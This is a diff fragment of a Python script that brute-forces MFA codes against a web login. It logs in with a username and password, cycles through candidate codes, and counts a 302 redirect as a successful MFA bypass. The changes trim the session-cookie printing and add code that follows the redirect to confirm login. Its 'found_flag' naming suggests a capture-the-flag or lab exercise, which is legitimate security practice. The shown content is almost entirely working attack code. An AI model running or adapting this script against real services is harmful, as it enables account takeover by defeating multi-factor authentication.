@@ -45,7 +45,7 @@ for mfa_code in mfa_codes:
     payload = {"csrf": csrf_token, "username": username, "password": password}
     response = session.post(f"{base_url}{endpoints[0]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)
     if int(mfa_code) % 250 == 0:
-        print(f"Entering login credentials... using session cookies: {session.cookies.get_dict()}")
+        print(f"Entering login credentials... using session cookies: {session.cookies.get_dict().get('session')}")
         print(f"Status code: {response.status_code}")
 
     if response.status_code != 302:  # Login failed
@@ -65,12 +65,20 @@ for mfa_code in mfa_codes:
     response = session.post(f"{base_url}{endpoints[1]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)
     if int(mfa_code) % 250 == 0:
         print(f"Brute-forcing with generated MFA code: {mfa_code}, Status: {response.status_code}")
-        print(f"Session cookies: {session.cookies.get_dict()}")
+        print(f"Session cookies: {session.cookies.get_dict().get('session')}")
             
     if response.status_code == 302:  # Successful MFA bypass
         found_flag = True
         last_code_attempted = mfa_code
+        
+        # Follow the redirect and print the final URL
+        redirected_url = response.headers.get("Location")
+        if redirected_url:
+            print(f"Following redirect to: {base_url}{redirected_url}")
+            final_response = session.get(f"{base_url}{redirected_url}", verify=ca_cert_path)
+            print(f"You are logged in. \nFinal URL: {final_response.url}")
         break
+    
     elif response.status_code == 400:  # Too many attempts or invalid
         print("Too many failed attempts. Aborting...")
         break
